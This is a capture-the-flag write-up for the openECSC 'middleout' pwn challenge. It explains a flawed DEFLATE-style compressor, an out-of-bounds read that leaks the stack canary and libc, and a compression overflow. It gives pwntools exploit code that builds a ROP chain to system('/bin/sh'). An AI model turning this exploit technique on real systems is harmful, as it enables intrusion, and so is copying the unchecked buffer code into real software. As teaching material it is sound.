# openECSC - Round 4

## [pwn] middleout (2 solves)

I implemented this compression algorithm, its performances are honestly amazing. I feel it's gonna be very competitive, it only needs to be better than Pied Piper! But I'm afraid there's something wrong with it...

`nc middleout.challs.open.ecsc2024.it 1337`

Author: Oliver Lyak <@ly4k>

## Overview

We are provided with the source code for an engine that uses a compression algorithm called "Middle-Out," a reference to the TV show Silicon Valley. Along with the code, we also have the compiled binary and the libraries used by the remote server.

When we run the binary, a menu is presented with options to compress, decompress, change parameters, shuffle the L-Tree, and print the L-Tree:

```
==============================================
  Welcome to the alpha version of Middle-Out  
          + Hendricks Codes engine!           
==============================================

==============================================
     Middle-Out + Hendricks Codes Engine
==============================================
  1. Compress
  2. Decompress
  3. Change Parameters
  4. Shuffle L-Tree
  5. Print L-Tree
  6. Exit
==============================================
  Please select an option: 
```

If we attempt to compress a long sequence of "A"s, we can see that the output is significantly smaller than the input and the "Weissman score" (a metric used in the TV show) is 14.750:

```
==============================================
  Welcome to the alpha version of Middle-Out  
          + Hendricks Codes engine!           
==============================================

==============================================
     Middle-Out + Hendricks Codes Engine
==============================================
  1. Compress
  2. Decompress
  3. Change Parameters
  4. Shuffle L-Tree
  5. Print L-Tree
  6. Exit
==============================================
  Please select an option: 1

Please enter the input string (hex format): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

============= Compression Result =============
Compressed size         : 4 bytes
Decompressed size       : 59 bytes
Weissman score          : 14.750
Output (hex)            : AB300A01
==============================================
```

Decompressing the compressed output reproduces the original input:

```
==============================================
     Middle-Out + Hendricks Codes Engine
==============================================
  1. Compress
  2. Decompress
  3. Change Parameters
  4. Shuffle L-Tree
  5. Print L-Tree
  6. Exit
==============================================
  Please select an option: 2

Please enter the input string (hex format): AB300A01

============ Decompression Result ============
Compressed size         : 4 bytes
Decompressed size       : 59 bytes
Weissman score          : 14.750
Output (hex)            : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
==============================================
```

We can also change compression parameters, like the window size and minimum match length. While their exact role isn't clear at first, we'll explore this later.

```
==============================================
     Middle-Out + Hendricks Codes Engine
==============================================
  1. Compress
  2. Decompress
  3. Change Parameters
  4. Shuffle L-Tree
  5. Print L-Tree
  6. Exit
==============================================
  Please select an option: 3

Enter the window size (default: 512): 256

Enter the minimum match length (default: 3): 10

[+] Parameters updated successfully.
```

Lastly, we have the option to shuffle and print the L-Tree, though its purpose is unclear for now.

```
==============================================
     Middle-Out + Hendricks Codes Engine
==============================================
  1. Compress
  2. Decompress
  3. Change Parameters
  4. Shuffle L-Tree
  5. Print L-Tree
  6. Exit
==============================================
  Please select an option: 4

[+] Shuffled L-Tree

==============================================
     Middle-Out + Hendricks Codes Engine
==============================================
  1. Compress
  2. Decompress
  3. Change Parameters
  4. Shuffle L-Tree
  5. Print L-Tree
  6. Exit
==============================================
  Please select an option: 5

[+] L-Tree
    [  0] -> 137        [  1] -> 188        [  2] ->  50        [  3] -> 275        [  4] ->  20
    [  5] -> 221        [  6] ->  89        [  7] -> 169        [  8] ->  60        [  9] ->  87
    [ 10] -> 423        [ 11] -> 359        [ 12] -> 159        [ 13] ->  42        [ 14] -> 127
    [ 15] -> 123        [ 16] -> 383        [ 17] ->  78        [ 18] ->   2        [ 19] -> 204
    ...
```

## Analysis

First, we examine the binary with `checksec`:

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

This helps us understand the constraints or primitives that may be needed to exploit the binary.

Now, let’s look at the source code. It's well-commented to help participants understand the algorithm.

### Source Code Overview

The code is split into multiple sections with different functionalities.

The initial section includes the necessary libraries, constants, and global variables:

```c
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include <alloca.h>

// Proprietary algorithm
#include "hendricks.h"

// Constants for buffer sizes, window size, and match length limits
#define MAX_INPUT_SIZE 4096
#define MAX_BUFFER_SIZE 4096
#define MAX_LENGTH 32767
#define MAX_WINDOW_SIZE 32767

#define DEFAULT_MIN_MATCH 3
#define DEFAULT_WINDOW_SIZE 512

// Global variables for compression parameters
static uint16_t window_size = DEFAULT_WINDOW_SIZE;
static uint16_t min_match = DEFAULT_MIN_MATCH;

// Data structure to manage a stream of bits (bit buffer)
typedef struct
{
    int pos;                         // Position in the buffer (in bits)
    int size;                        // Size of the buffer (in bytes)
    uint8_t buffer[MAX_BUFFER_SIZE]; // Actual buffer holding the data
} BitStream;
```

There are some utility functions for tasks like swapping elements, converting hexadecimal characters to integers, decoding hex strings to byte arrays, and reading user input:

```c
// ---------------------------------------------------------
// Utility functions (Swap, Hex Conversion, Input Handling)
// ---------------------------------------------------------

// Function to swap two elements of type 'Code'
void swap(Code *a, Code *b)
{
    // ...
}

// Converts a single hexadecimal character to its integer equivalent
int hex_char_to_int(char c)
{
    // ...
}

// Memory-safe version of hex decoding
// Converts a hex string into a byte array (bit stream)
int hex_decode(const char *input, int input_size, uint8_t *output_stream)
{
    // ...
}

// Prompts user for hex input and decodes it into the provided BitStream
int get_hex_input(BitStream *input)
{
    // ...
}

// Function to read an integer from user input
int get_int()
{
    // ...
}

// Function to validate an integer input with a default and max value
int read_and_validate_input(const char *prompt, int default_value, int max_value)
{
    // ...
}
```

Then, there are functions for reading and writing bits from a bitstream:

```c
// ---------------------------------------------------------
// BitStream operations (Writing and Reading Bits)
// ---------------------------------------------------------

// Writes 'bit_count' bits from 'value' into the bitstream
void write_bits(BitStream *stream, int value, int bit_count)
{
    // ...
}

// Reads 'bit_count' bits from the bitstream
int read_bits(BitStream *stream, int bit_count)
{
    // ...
}
```

The next section has the encoding and decoding functions for something called Hendricks codes, which will be discussed later.

```c
// ---------------------------------------------------------
// Encoding and Decoding Functions
// ---------------------------------------------------------

// Encodes a literal using Hendricks codes and writes it to the bitstream
void encode_literal(BitStream *stream, int literal)
{
    // ...
}

// Encodes a distance value using Hendricks codes and writes it to the bitstream
void encode_distance(BitStream *stream, int distance)
{
    // ...
}

// Decodes a Hendricks code from the bitstream using the provided tree
int decode_hendricks(BitStream *stream, const Code *tree, int tree_size)
{
    // ...
}
```

Finally, we have the compression and decompression functions, `MO_Compress` and `MO_Decompress`.

```c
// ---------------------------------------------------------
// Compression and Decompression Functions
// ---------------------------------------------------------

// Middle-Out + Hendricks Codes Compression function
void MO_Compress(BitStream *input, BitStream *output)
{
    // ...
}

// Middle-Out + Hendricks Codes Decompression function
int MO_Decompress(BitStream *input, BitStream *output)
{
    // ...
}
```

The rest of the source code contains implementations of menu options, which call the relevant functions from earlier sections. Here's an example of the compress function:

```c
// ---------------------------------------------------------
// Core Operation Functions (Compression, Decompression, etc.)
// ---------------------------------------------------------

// Handles the compression operation
void do_compress()
{
    BitStream input_stream;
    BitStream output_stream;
    output_stream.pos = 0;
    output_stream.size = MAX_INPUT_SIZE;
    memset(output_stream.buffer, '\0', MAX_INPUT_SIZE);

    if (get_hex_input(&input_stream) == -1)
        return;

    MO_Compress(&input_stream, &output_stream);
    print_compression_results(&input_stream, &output_stream);
}
```

We are also provided with the `hendricks.h` file, which looks like:

```c
#define D_CODES 30
#define LITERALS 256
#define L_CODES (LITERALS + 1 + D_CODES)

typedef struct {
    uint16_t code;
    uint8_t bit_length;
} Code;

// Hendricks' Literal and Distance Trees
Code hendricks_ltree[L_CODES] = {
    { 12,  8}, {140,  8}, { 76,  8}, {204,  8}, { 44,  8},
    {172,  8}, {108,  8}, {236,  8}, { 28,  8}, {156,  8},
    { 92,  8}, {220,  8}, { 60,  8}, {188,  8}, {124,  8},
    {252,  8}, {  2,  8}, {130,  8}, { 66,  8}, {194,  8},
    { 34,  8}, {162,  8}, { 98,  8}, {226,  8}, { 18,  8},
    {146,  8}, { 82,  8}, {210,  8}, { 50,  8}, {178,  8},
    {114,  8}, {242,  8}, { 10,  8}, {138,  8}, { 74,  8},
    {202,  8}, { 42,  8}, {170,  8}, {106,  8}, {234,  8},
    { 26,  8}, {154,  8}, { 90,  8}, {218,  8}, { 58,  8},
    {186,  8}, {122,  8}, {250,  8}, {  6,  8}, {134,  8},
    // ...
};

const Code hendricks_dtree[D_CODES] = {
    { 0, 5}, {16, 5}, { 8, 5}, {24, 5}, { 4, 5},
    {20, 5}, {12, 5}, {28, 5}, { 2, 5}, {18, 5},
    {10, 5}, {26, 5}, { 6, 5}, {22, 5}, {14, 5},
    {30, 5}, { 1, 5}, {17, 5}, { 9, 5}, {25, 5},
    { 5, 5}, {21, 5}, {13, 5}, {29, 5}, { 3, 5},
    {19, 5}, {11, 5}, {27, 5}, { 7, 5}, {23, 5}
};

const int base_lengths[D_CODES] = {
       0,     1,     2,     3,     4,     6,     8,    12,    16,    24,
      32,    48,    64,    96,   128,   192,   256,   384,   512,   768,
    1024,  1536,  2048,  3072,  4096,  6144,  8192, 12288, 16384, 24576
};

const int extra_length_bits[D_CODES]
    = {0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13};
```

### Compression Algorithm

The compression algorithm combines two methods: Middle-Out and Hendricks codes. If you're familiar with compression, you'll recognize it as a simplified version of the DEFLATE algorithm, commonly used in the ZIP format. DEFLATE combines LZ77 and Huffman coding.

LZ77 is a sliding-window compression algorithm that replaces repeated sequences of characters with references to their previous occurrences. This is evident in the `MO_Compress` function:

```c

// Middle-Out + Hendricks Codes Compression function
void MO_Compress(BitStream *input, BitStream *output)
{
    for (int i = 0; i < input->size;)
    {
        int best_offset = 0, best_length = 0;

        // Find the longest match in the sliding window
        for (int offset = 1; offset <= i && offset < window_size; ++offset)
        {
            int length = 0;
            while (length < MAX_LENGTH && i + length < input->size &&
                   input->buffer[i - offset + length] == input->buffer[i + length])
            {
                ++length;
            }

            if (length >= min_match && length > best_length)
            {
                best_length = length;
                best_offset = offset;
            }
        }

        // Write the match or literal to the output stream
    }
}
```

The `MO_Compress` function scans the input buffer to find the longest match within a sliding window. If a match's length is equal to or greater than the minimum match length, the algorithm stores the best offset and length, similar to LZ77. Here we also see the use of the window size and minimum match length parameters.

Huffman coding is a way to encode data more efficiently by assigning shorter codes to more frequent characters and longer codes to less frequent characters. These codes are usually 7-9 bits long, and therefore we see the use of the bitstream functions to read and write bits rather than bytes. A Huffman tree can be either static or dynamic, and in this case, we have a static Huffman tree defined in the `hendricks.h` file. The static Huffman tree is actually the static Huffman tree used in ZLIB ([https://github.com/madler/zlib/blob/develop/trees.h](https://github.com/madler/zlib/blob/develop/trees.h)).

In `MO_Compress`, if the best length is greater than or equal to the minimum match length, it encodes the match length using Hendricks codes and writes it to the output stream. Otherwise, it encodes the literal byte.

```c
void MO_Compress(BitStream *input, BitStream *output)
{
    for (int i = 0; i < input->size;)
    {
        // ... find the longest match in the sliding window

        if (best_length >= min_match)
        {
            // Encode the match length using Hendricks codes
            int length_code = 0;
            for (length_code = 0; length_code < D_CODES; length_code++)
            {
                if (base_lengths[length_code] > best_length)
                    break;
            }
            length_code--;

            encode_literal(output, LITERALS + 1 + length_code);

            // Handle extra bits for the match length
            if (extra_length_bits[length_code] > 0)
            {
                int extra_bits = best_length - base_lengths[length_code];
                write_bits(output, extra_bits, extra_length_bits[length_code]);
            }

            // Encode the match distance
            encode_distance(output, best_offset);
            i += best_length;
        }
        else
        {
            // Encode literal byte
            encode_literal(output, input->buffer[i]);
            ++i;
        }
    }
}
```

For a match, a `length_code` is determined based on the match length. The `base_lengths` array is then used to find the base length and extra bits for encoding the match length:

```c
const int base_lengths[D_CODES] = {
       0,     1,     2,     3,     4,     6,     8,    12,    16,    24,
      32,    48,    64,    96,   128,   192,   256,   384,   512,   768,
    1024,  1536,  2048,  3072,  4096,  6144,  8192, 12288, 16384, 24576
};
```

For instance, if the match length is 10, `length_code` 6 is used, corresponding to a base length of 8. The number of extra bits required is derived from the `extra_length_bits` array:

```c
const int extra_length_bits[D_CODES]
    = {0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13};
```

In this case, we would need 2 extra bits to encode the missing 2 bits to get from 8 to 10.

Encoding involves `encode_literal` and `encode_distance` functions for literals and distance values. For length codes, `LITERALS + 1 + length_code` is used, where `LITERALS` is defined as 256. The `encode_literal` function takes the literal code, looks it up in the `hendricks_ltree` array, and writes the code to the output stream.

```c
// Encodes a literal using Hendricks codes and writes it to the bitstream
void encode_literal(BitStream *stream, int literal)
{
    Code code = hendricks_ltree[literal];
    write_bits(stream, code.code, code.bit_length);
}
```

The `encode_distance` function works in a similar way, but instead of using the `hendricks_ltree` array, it uses the `hendricks_dtree` array to encode the distance value. It also uses the same algorithm to find the base length and extra bits needed to encode the distance value.

```c
// Encodes a distance value using Hendricks codes and writes it to the bitstream
void encode_distance(BitStream *stream, int distance)
{
    int dist_code = 0;
    for (dist_code = 0; dist_code < D_CODES; dist_code++)
    {
        if (base_lengths[dist_code] > distance)
            break;
    }
    dist_code--;

    Code dcode = hendricks_dtree[dist_code];
    write_bits(stream, dcode.code, dcode.bit_length);

    // Handle extra bits for distance if needed
    if (extra_length_bits[dist_code] > 0)
    {
        int extra_bits = distance - base_lengths[dist_code];
        write_bits(stream, extra_bits, extra_length_bits[dist_code]);
    }
}
```

So we have two parts of the algorithm: LZ77 and Huffman coding. The Huffman coding tries to use shorter bit sequences to encode more frequent sequences of bytes. It does so by looking up the literal in the static Huffman tree and writing the code to the output stream. This is why shuffling the L-Tree is a menu option, as it would change the static Huffman tree and therefore the compression ratio, as some literals would then be encoded with different codes with different lengths.

### Decompression Algorithm

The decompression algorithm is the reverse of the compression algorithm. It first attempts to decode a literal from the input stream using the `decode_hendricks` function. The `decode_hendricks` function reads a number of bits from the input stream and tries to find a match in the provided tree. If it finds a match, it returns the index of the match in the tree. If it doesn't find a match, it returns -1. After decoding the literal, the decompression algorithm checks if the literal is less than 256. If it is, it writes the literal to the output stream. If the literal is 256, it breaks out of the loop, as this is the end of block marker. If the literal is greater than 256, it decodes the length and distance values and writes the matched data to the output stream.

```c
// Decodes a Hendricks code from the bitstream using the provided tree
int decode_hendricks(BitStream *stream, const Code *tree, int tree_size)
{
    for (int i = 0; i < tree_size; i++)
    {
        int bits = read_bits(stream, tree[i].bit_length);
        if (bits == tree[i].code)
            return i;
        stream->pos -= tree[i].bit_length; // Revert position if no match
    }
    return -1; // Error if no code matches
}

// Middle-Out + Hendricks Codes Decompression function
int MO_Decompress(BitStream *input, BitStream *output)
{
    input->pos = 0;
    output->pos = 0;

    while (input->pos < input->size * 8 && output->pos < output->size)
    {
        int literal = decode_hendricks(input, hendricks_ltree, L_CODES);

        if (literal < 0)
        {
            fprintf(stderr, "\n[Error] Invalid code.\n");
            return -1; // Error: invalid code
        }
        else if (literal < 256)
        {
            output->buffer[output->pos++] = literal;
        }
        else if (literal == 256)
        {
            break; // End of block marker
        }
        else
        {
            // Match length-distance pair
            int length_code = literal - LITERALS - 1;
            int match_length = base_lengths[length_code];

            // Read extra bits for match length if needed
            if (extra_length_bits[length_code] > 0)
            {
                match_length += read_bits(input, extra_length_bits[length_code]);
            }

            int dist_code = decode_hendricks(input, hendricks_dtree, D_CODES);
            int match_dist = base_lengths[dist_code];

            // Read extra bits for match distance if needed
            if (extra_length_bits[dist_code] > 0)
            {
                match_dist += read_bits(input, extra_length_bits[dist_code]);
            }

            // Copy matched data from the previous buffer position
            for (int j = 0; j < match_length && output->pos < output->size; ++j)
            {
                output->buffer[output->pos++] = output->buffer[output->pos - match_dist]; // Copy from match distance
            }
        }
    }

    return output->pos;
}
```

## Solution

After reading the source code and understanding the most important parts of the algorithm, we can start to think about how to exploit it. Apart from the utility functions used, there are really only two interesting parts of the algorithm: the compression and decompression functions.

Intuitively, one might think that the decompression function contains a buffer overflow vulnerability, but this *should* actually not be the case. We see multiple checks in the decompression that the output buffer position `output->pos` is less than the output buffer size `output->size`. This means that we can't overflow the output buffer by providing a large input buffer.

However, there is no such check in the compression function. It is running under the assumption that when an input buffer is compressed, it cannot be larger than the output buffer. This is a common assumption in compression algorithms, as the whole point is to make the output smaller than the input. So if we can find a way to make the compressed output larger than the input, we might be able to exploit this assumption.

### Buffer Overflow

When using the compression option, we notice that an output stream is created with a size of `MAX_INPUT_SIZE`:

```c
// Handles the compression operation
void do_compress()
{
    BitStream input_stream;
    BitStream output_stream;
    output_stream.pos = 0;
    output_stream.size = MAX_INPUT_SIZE;
    memset(output_stream.buffer, '\0', MAX_INPUT_SIZE);

    if (get_hex_input(&input_stream) == -1)
        return;

    MO_Compress(&input_stream, &output_stream);
    print_compression_results(&input_stream, &output_stream);
}
```

But inside the `MO_Compress` function, we see that the output stream is written to without any checks:

```c
// Middle-Out + Hendricks Codes Compression function
void MO_Compress(BitStream *input, BitStream *output)
{
    for (int i = 0; i < input->size;)
    {
        // ... find the longest match in the sliding window

        if (best_length >= min_match)
        {
            // ...

            encode_literal(output, LITERALS + 1 + length_code);

            // Handle extra bits for the match length
            if (extra_length_bits[length_code] > 0)
            {
                int extra_bits = best_length - base_lengths[length_code];
                write_bits(output, extra_bits, extra_length_bits[length_code]);
            }

            // Encode the match distance
            encode_distance(output, best_offset);
            i += best_length;
        }
        else
        {
            // Encode literal byte
            encode_literal(output, input->buffer[i]);
            ++i;
        }
    }
}
```

Looking at the static Huffman tree, we see that some codes are 7 bits long, some 8 bits long, and some 9 bits long. This means that if `MAX_INPUT_SIZE` is set to 4096, the output buffer can be at most 4096 * 8 = 32768 bits long. However, if our input buffer contains a sequence of bytes that all compress to a code that is 9 bits long, we can make the output buffer 4096 * 9 = 36864 bits long. This would be a buffer overflow of 4096 bits (512 bytes). But, the LZ77 algorithm is designed to find the longest match, so if we use the same byte over and over again, it will just be compressed down to a short length-distance pair. But we know that a match is only found if the length of the match is greater than or equal to the minimum match length. Furthermore, the window size determines the length of the sliding window, which means that the algorithm can only find matches within the window size. So if we set the window size to 1, and a minimum match length of 2, then it can never find a match. This way, we can make the output buffer larger than the input buffer.

Lastly, we need to find a payload that when compressed is a valid ROP chain. We should be able to decompress our ROP chain, such that when it is compressed, it will be our original ROP chain. It is however not so simple. First, some 8 bit outputs does not exist when compressing, such as the byte `240`. Second, some literals are 7 bits and others are 8 or 9 bits, which doesn't guarantee an input byte that matches our desired output byte. Furthermore, some bytes or bit sequences when decompressed will actually be interpreted as length-distance pairs, thus giving us a broken output. If this part is confusing, I recommend reading the compression algorithm part again to understand that we cannot always decompress a compressed ROP chain to get the original ROP chain. At least not without some modifications.

Here comes the Shuffle L-Tree option into play. By shuffling the L-Tree, we can change the static Huffman tree, such that some literals are encoded with different codes. This means that we can change the output of the compression algorithm, such that when decompressed, it will be our original ROP chain. The shuffle option is random, so we have to rely on luck. But if we can shuffle the L-Tree enough times, we should be able to find a shuffle that works such that when our ROP chain is decompressed, it results in a payload that is smaller than 512 bytes, and when compressed, it results in our original ROP chain (or at least something that matches the beginning). Because of ASLR, there are also some output bytes that are not producible by the compression algorithm, so we would have to run the exploit over and over again (spoiler: it works 9/10 times).

### Leak

Now that we have an idea for the stack buffer overflow, we need to find a way to leak the stack canary and the libc base address. To get this leak, we exploit the decompression function.

When a length-distance pair is encountered, it loops over the match length and copies the data from `output->buffer[output->pos - match_dist]` to `output->buffer[output->pos]`. There should have been a check to ensure that `output->pos - match_dist` is within the bounds of the output buffer, but there isn't. This means that if we encode a length-distance pair as length 4096 and distance 4096, we can leak 4096 bytes of data from before the output buffer on the stack.

```c
// ...
// Copy matched data from the previous buffer position
for (int j = 0; j < match_length && output->pos < output->size; ++j)
{
    output->buffer[output->pos++] = output->buffer[output->pos - match_dist]; // Copy from match distance
}
```

At this point, you take the source code, and change it a bit to encode arbitrary length-distance pairs. We can then use GDB to look at what lies before the output buffer on the stack. We can then use this to find the stack canary and the libc base address by leaking out-of-bounds data.

The helper program to encode arbitrary length-distance pairs can be found in [./writeup/helper/helper.c](./writeup/helper/helper.c).

## Exploit

The full exploit can be found in [./checker/\_\_main\_\_.py](./checker/__main__.py).

First, I noted that for the leak, there wasn't anything useful before the output buffer on the stack if you call the decompression function immediately. We should first make sure that we call enough nested functions that use that part of the stack. I found by first compressing a string "AABBCCDDEE" would result in nested functions that would eventually claim these bytes on the stack. So we should first compress this string before our leak:

```python
io = start()

# Dummy compression to ensure stack contains garbage from nested functions (leaks)
io.sendlineafter(b"Please select an option: ", b"1")
io.sendline(b"AABBCCDDEE"*2)
```

Next, I found that at distance 4736 before the output buffer, we would find a stack canary and an address pointing somewhere inside libc (`_IO_2_1_stdout_`). As such, I used the helper program to encode the length-distance pair of length 24 and distance 4736 to leak these values. This resulted in the string `280C4001`. So if we decompress this string, we should get the stack canary and the libc address.

```
==============================================
  Welcome to the alpha version of Middle-Out  
          + Hendricks Codes engine!           
==============================================

==============================================
     Middle-Out + Hendricks Codes Engine
==============================================
  1. Compress
  2. Decompress
  3. Change Parameters
  4. Shuffle L-Tree
  5. Print L-Tree
  6. Exit
==============================================
  Please select an option: 1

Please enter the input string (hex format): AABBCCDDEEAABBCCDDEE

============= Compression Result =============
Compressed size         : 8 bytes
Decompressed size       : 10 bytes
Weissman score          : 1.250
Output (hex)            : AB769FB9FB0E9A04
==============================================

==============================================
     Middle-Out + Hendricks Codes Engine
==============================================
  1. Compress
  2. Decompress
  3. Change Parameters
  4. Shuffle L-Tree
  5. Print L-Tree
  6. Exit
==============================================
  Please select an option: 2

Please enter the input string (hex format): 280C4001

============ Decompression Result ============
Compressed size         : 5 bytes
Decompressed size       : 24 bytes
Weissman score          : 4.800
Output (hex)            : 0001CB1A377BA5D1000000000000000080B7817179730000
==============================================

==============================================
     Middle-Out + Hendricks Codes Engine
==============================================
  1. Compress
  2. Decompress
  3. Change Parameters
  4. Shuffle L-Tree
  5. Print L-Tree
  6. Exit
==============================================
  Please select an option: 
```

In this case, we get the leak `0001CB1A377BA5D1000000000000000080B7817179730000`, where the first 8 bytes are the stack canary and the last 8 bytes are the libc address (be aware of endianness). In the exploit, it looks like this:

```python
# Decompress vulnerability to read out of bounds
io.sendlineafter(b"Please select an option: ", b"2")
io.sendlineafter(b"Please enter the input string (hex format): ", b"280C4001") # Read length = 24, distance = 4736 (see helper)

io.recvuntil(b"Output (hex)            : ")
leak = io.recvline().decode().strip()
leak = bytes.fromhex(leak)
canary = u64(leak[:8])
libc_leak = u64(leak[16:24])
log.info(f"Canary: {hex(canary)}")
log.info(f"Libc leak: {hex(libc_leak)}") # _IO_2_1_stdin_
libc.address = libc_leak - libc.sym["_IO_2_1_stdout_"]
log.info(f"Libc base: {hex(libc.address)}")
log.info(f"system: {hex(libc.sym['system'])}")
log.info(f"/bin/sh: {hex(next(libc.search(b'/bin/sh')))}")
```

Now that we have the leak, we should attempt to perform the buffer overflow. First, we change the parameters to make sure that the LZ77 part of the algorithm (length-distance) is not used.

```python
# Change parameters for easier compression (literals only, no matches)
io.sendlineafter(b"Please select an option: ", b"3")
io.sendlineafter(b"512): ", b"1") # window size
io.sendlineafter(b"3): ", b"10000") # min match
```

Now, with the default L-tree, `AA` will compress to a code with 9 bits, whereas `41` will compress to a code with `8` bits. But just using the default L-tree will not work for our ROP chain, as for instance a null-byte is reserved for the literal 256 (end of block marker). So we have no way of decompressing something that will compress into a null-byte.

For reference, our ROP chain is a simple ROP chain that calls `system("/bin/sh")`. The ROP chain is as follows:

```python
pop_rdi = libc.address + 0x000000000002a3e5 # 0x000000000002a3e5 : pop rdi ; ret
ret =     libc.address + 0x0000000000029139 # 0x0000000000029139 : ret

extra_ret = p64(ret) if EXTRA_PADDING else b"" # For stack alignment

payload = p64(canary) + b"A"*8 + extra_ret + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym["system"])
```

So, we must shuffle the L-tree over and over again until we find a shuffle that works for our ROP chain. This is done in the exploit as follows:

```python
# Shuffle tree until a decompressed payload is < 456 bytes

for i in range(100):
    log.debug(f"Trying shuffle {i}")
    io.sendlineafter(b"Please select an option: ", b"4") # Shuffle
    io.sendlineafter(b"Please select an option: ", b"2") # Decompress
    io.sendlineafter(b"Please enter the input string (hex format): ", payload.hex().encode())
    res = io.recvuntil(b"1. Compress").decode()
    if "[Error]" in res:
        continue

    try:
        payload_size = int(res.split("Decompressed size       : ")[1].split(" bytes")[0])
    except Exception as e:
        # Sometimes stderr is flushed after stdout, so if there really was an error, we didn't handle it earlier, so we just handle it now
        continue

    if payload_size >= 456:
        continue

    # Try to decompress and compress and expect to get a compressed payload that starts with our payload
    decompressed_payload = res.split("Output (hex)            : ")[1].split("\n")[0]

    io.sendlineafter(b"Please select an option: ", b"1") # Compress
    io.sendlineafter(b"Please enter the input string (hex format): ", decompressed_payload.encode())

    io.recvuntil(b"Output (hex)            : ")
    compressed_payload = io.recvline().decode().strip().lower()

    if compressed_payload.startswith(payload.hex()):
        # Good, we found a short decompressed payload that compresses to our payload
        break
else:
    log.warn("Failed to find decompressed payload. Re-run the exploit")
    return False
```

Sometimes, because of ASLR, libc will be loaded at bad addresses, and there doesn't exist a match by just shuffling the tree over and over again. And this is because the L-tree doesn't contain all the output literals from 0-255. In only contains some of them. For instance, it is impossible to encode `240` in the default L-tree, and we cannot change the output encodings, only which input translates to which output.

After shuffling the L-tree and finding a decompressed payload that when compressed matches the beginning of our ROP chain, we now need to find two bytes where one of them compresses to 8 bits, and the other compresses to 9 bits. The reason for finding one that compresses to 8 bits is that we need to perfectly align the compressed payload with the beginning of our ROP chain and where is it placed on the stack.

The output buffer is 4096, and right after, we find the stack canary, the base pointer, and the return address. This means that our padding of 9-bits should fit perfectly into the 4096 bytes, or our ROP chain will be misaligned on the bit-level. And 4096 / 9 = 455.111111, so we need to find a combination of 8 and 9 bit values that perfectly aligns to 4096. And it turns out that the buffer size is 4096 * 8 = 32768 bits, and 3640 * 9 + 8 = 32768.

To find a 9 and 8-bit value, we brute force our way through all 0-255 values:

```python
bit9 = None
bit8 = None

# Let's find new 9 and 8 bit values for our padding
# If a byte when compressed is 9 bits, then 8 bytes of that byte will be 8 * 9 / 8 = 9 bytes compressed
# If a byte when compressed is 8 bits, then 8 bytes of that byte will be 8 bytes compressed
for i in range(0x100):
    log.debug(f"Trying debug {i}")
    io.sendlineafter(b"Please select an option: ", b"1") # Compress
    io.sendlineafter(b"Please enter the input string (hex format): ", bytes([i]*8).hex().encode()) # Compress 8 bytes of the same value
    res = io.recvuntil(b"1. Compress")
    if b"[Error]" in res:
        continue

    compressed_size = int(res.decode().split("Compressed size         : ")[1].split(" bytes")[0])
    if compressed_size == 9 and bit9 is None:
        bit9 = i
    elif compressed_size == 8 and bit8 is None:
        bit8 = i

    if bit9 is not None and bit8 is not None:
        break
else:
    log.warn("Failed to find suitable bytes. Re-run the exploit")
    return False
```

Finally, we combine our padding with the ROP payload and send it to the server:

```python
# Buffer size is 4096 * 8 = 32768 bits
# Padding compressed = 3640 * 9 + 8 = 32768 bits
# Padding decompressed = 3640 * 8 + 8 = 29128 bits
padding = bytes([bit9])*3640 + bytes([bit8])

io.sendlineafter(b"Please select an option: ", b"1")
io.sendlineafter(b"Please enter the input string (hex format): ", padding.hex().encode() + decompressed_payload.encode())

io.recvuntil(b"==============================================")
io.recvline()

io.interactive()
```

## Conclusion

I had a lot of fun creating this challenge from a programming perspective. I thought it would be fun for participants to exploit an implementation of a semi-complex real-world algorithm, and the DEFLATE compression algorithm (LZ77 and Huffman coding) felt like a perfect choice, given its use in many tools and formats like ZIP, PNG, and GZIP. Who knows, there might even be other parsers out there with flawed implementations...

I hope you learned something new, and that you enjoyed the challenge and writeup.

If you have any questions or feedback, feel free to reach out to me on X/Twitter ([@ly4k_](https://twitter.com/ly4k_)), Discord, or wherever you find me.